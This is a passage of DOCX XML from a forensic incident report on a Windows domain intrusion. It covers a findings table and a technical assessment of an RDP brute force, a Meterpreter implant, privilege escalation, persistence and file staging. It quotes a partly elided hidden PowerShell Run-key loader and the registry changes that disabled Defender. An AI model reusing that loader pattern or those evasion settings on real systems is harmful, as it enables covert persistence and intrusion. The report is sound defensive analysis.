            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-026</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Collection detail: attacker browsed all user profiles in Explorer, built "My Social Security Number.zip" via Explorer, renamed it loot.zip, and permanently deleted it (no Recycle Bin)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2020-09-18 05:49:10 → 2020-09-19 03:47:39.785228</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-013</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Collection: Administrator opened mortysmith's personal files (SSN, Plans, Thoughts, Portal_gun.png), zipped them as loot.zip, then deleted the archive</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2020-09-18 21:42:35.500078 → 2020-09-19 03:47:48.926185</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-031</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Exfiltration assessment: tiny staged archive (loot.zip from 22-byte SSN file) and only plausible channel is the encrypted Meterpreter C2 or the RDP session; no cloud, BITS, SMB, HTTP-upload or DNS exfil</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2020-09-18 22:50:19.426026 → 2020-09-19 04:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-007</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Defense evasion: Windows Defender real-time protection, MAPS reporting and sample submission disabled during the RDP session</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2020-09-18 22:52:57.112379 → 2020-09-19 03:39:49.843705</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-018</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Intrusion path on the wire: RDP brute force of DC Administrator from 194.61.24.102, then RDP DC (10.42.85.10) → DESKTOP-SDN1RPT matching the 4624 type 10 logon</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2020-09-19 02:19:26.619607 → 2020-09-19 03:36:24.432948</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-011</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Network context: external host 194.61.24.102 RDP to the DC, DC downloads coreupdater.exe and gets Meterpreter sessions from 203.78.103.109; capture clock ~1 h behind host clock</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2020-09-19 02:21:27.226262 → 2020-09-19 03:40:45.191906</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-006</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Lateral movement: RDP logon (type 10) of domain account C137\Administrator from DC 10.42.85.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2020-09-19 02:35:55.347240 → 2020-09-19 03:52:13.468385</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-029</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Download provenance of coreupdater.exe: typed navigation to http://194.61.24.102/ in legacy Edge, Save-As to Downloads with Mark-of-the-Web, MOTW stream removed at first execution after SmartScreen check</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:05.286189 → 2020-09-19 03:40:49.317328</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-023</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="C00000"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>confirmed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Attacker session privileges: C137\Administrator RDP logon (LogonId 0x857E73) holds Domain Admins + Enterprise Admins + SeDebugPrivilege; ricksanchez (Domain Admin) cached logon at 05:08 triggered the Run-key loader</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2020-09-19 03:36:22.980909 → 2020-09-19 05:08:15.224627</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-014</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="C00000"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>probable</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>SRUM: coreupdater.exe network traffic continues in the 04:14–05:14 slot; PowerShell (ricksanchez) traffic at 05:08 loader</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2020-09-19 04:14:00 → 2020-09-19 05:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-025</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E36C09"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>probable</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Network share exposure: ricksanchez's persistent mapped drive Z: = \\CITADEL-DC01\FileShare reconnected at the 05:08 logon that fired the Meterpreter Run-key loader</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2020-09-18 22:45:26.988114 → 2020-09-19 04:08:16.637781</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-022</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E36C09"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>confirmed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Remote Desktop Users group populated by C137\ricksanchez (Domain Administrator, Domain Admins, Domain Users, mortysmith) — enabled the later RDP path</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2020-09-18 22:52:49.588649 → 2020-09-19 03:36:23.009739</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-030</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E36C09"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>confirmed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Defense-evasion / anti-forensics assessment: no log clearing, no timestomping, no wiping; only evasion = Defender weakening (persisting until acquisition) and MOTW removal</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2020-09-18 22:52:57.112379 → 2020-09-19 03:47:09.917465</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-004</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="4F81BD"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>confirmed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Timeline anomaly: system clock changes (Security 4616) on 2020-09-18</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2020-09-18 04:58:02.307663 → 2020-09-19 01:54:37.447633</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-003</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="4F81BD"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>confirmed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Scope limitation: no process-creation telemetry outside boot (no Sysmon, 4688 only at boot), PowerShell logs only cover 2020-09-19 05:08</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2020-09-19 03:44:03.540241 → 2020-09-19 05:08:42.966250</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Technical assessment</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Host: DESKTOP-SDN1RPT, Windows 10 Enterprise Evaluation 19041 x64 on VMware. Installed 2020-09-18 05:47, joined to C137.local at 21:42, last boot 2020-09-19 01:24:04. The pcap clock runs about 1 h behind the host clock; this offset was validated on three pivots (F-011/F-032).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**1. Initial access (F-006, F-018, F-022, F-023)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Network: an nmap RDP scan plus 198 Administrator RDP logon requests from 194.61.24.102 to the DC, then an RDP flow from the DC to the workstation.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 4624 type 10 at 03:36:24: C137\Administrator, S-1-5-21-2232410529-1445159330-2725690660-500, from 10.42.85.10, LogonId 0x857E73. Corroborated by RCM 1149 and RdpCoreTS 168.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The session token carries Domain Admins (-512), Enterprise Admins (-519) and SeDebugPrivilege.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The RDP path was allowed because ricksanchez had added these accounts to Remote Desktop Users at 22:55:33 the day before.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**2. Defense evasion (F-007, F-030)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Defender 5001/5007 at 03:39:45–49: DisableRealtimeMonitoring=1, SpyNet 2→0, SubmitSamples 1→0, TamperProtection 0x1→0x4. Defender stayed off until acquisition.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- MOTW (Zone.Identifier) was removed at the 03:40:49 launch.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No log clearing (no 1102/104, no gaps in EventRecordIDs), no timestomping, no wiping.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**3. Delivery and execution (F-008, F-012, F-017, F-027, F-029)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 03:39:26: legacy Edge opens http://194.61.24.102/ as a typed URL (no Referer).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 03:39:57: GET /coreupdater.exe, 7168 bytes. Hashes: MD5 eed41b4500e473f97c50c7385ef5e374, SHA1 fd153c66386ca93ec9993d66a84d6f0d129a3a5c, SHA256 10f3b92002bb98467334161cf85d0b1730851f9256f83c27db125e9a0c1cfda6. The network hash matches Amcache.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Save-As to Downloads (the .partial file was MFT 26213), then an Explorer move to System32 at 03:40:42.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Executed at 03:40:49: Prefetch, UserAssist, SRUM, PCA, and memory psscan PID 8324 (exited 03:43:10).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- C2 flow 50875 to 203.78.103.109:443: Suricata 'PE over raw TCP' and Metasploit Bind_API alerts, about 280 KB up / 1.76 MB down.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- cmd.exe at 03:41:06 with clipboard pastes; sc.exe at 03:42:42.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**4. Privilege escalation and process injection (F-009, F-015)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 7045 for the getsystem service "nehgye" at 03:43:14.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Memory: spoolsv.exe PID 2188 (SYSTEM) has a PE region (MZ header, RWX) at 0x1840000, holds the C2 socket and a handle to lsass.exe.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**5. Persistence (F-019, F-020, F-010)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- HKLM\...\Run\coreupdate, written 03:44:03, runs: `powershell -nop -w hidden -c ... iex(... (Get-Item 'HKLM:Software\q9Z1bssi').GetValue('JqxNhWJA'))`. This is the Metasploit registry_persistence pattern.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- It fired at ricksanchez's logon at 05:08:37–44. Evidence: Shell-Core 9707/9708, PowerShell 400/600/4104, Prefetch, psscan PID 508→3316. Memory malfind in PID 3316 and a live C2 socket via flow 50972 (F-016).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Service "coreupdater" (auto start, LocalSystem, C:\Windows\System32\coreupdater.exe) was created by 7045 at 03:42:42. It has not started yet because there was no reboot after installation.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**6. Collection, staging and exfiltration (F-013, F-026, F-031)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- ShellBags show browsing of the Admin, mortysmith and ricksanchez profiles (03:45:07–03:51:14). LNK files show the opening of mortysmith's SSN, Plans, Thoughts and Portal_gun.png.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- $J: "My Social Security Number.zip" (MFT 87470-2) created at 03:46:15, renamed loot.zip at 03:46:18, deleted at 03:47:09 without going through the Recycle Bin.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No archiver tools, cloud/BITS uploads, SMB writes, HTTP uploads, DNS tunnelling or USB exfiltration were found. The only plausible channels are the encrypted Meterpreter C2 and the RDP clipboard.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**7. Lateral movement (F-024, F-025)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The workstation was a target, not a pivot. There is no outbound RDP, PsExec, WinRM or RMM activity.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- ricksanchez's Z: drive (\\CITADEL-DC01\FileShare) is exposed to the Domain Admin Meterpreter session; only about 28 KB went over SMB.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**8. Context and noise**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Responder collection is excluded from the findings (F-002, F-028): SanDisk "Incident_drive", FTK Imager 4.2.1.4, collection starting at 05:08:58.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. Scope, sources and methodology</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.1 Analyzed system</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Observed host names</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>DESKTOP-SDN1RPT.C137.local (32889), DESKTOP-SDN1RPT (13648), WIN-2IH1TBB9I4Q (1279), go.microsoft.com (13)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Observed accounts</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
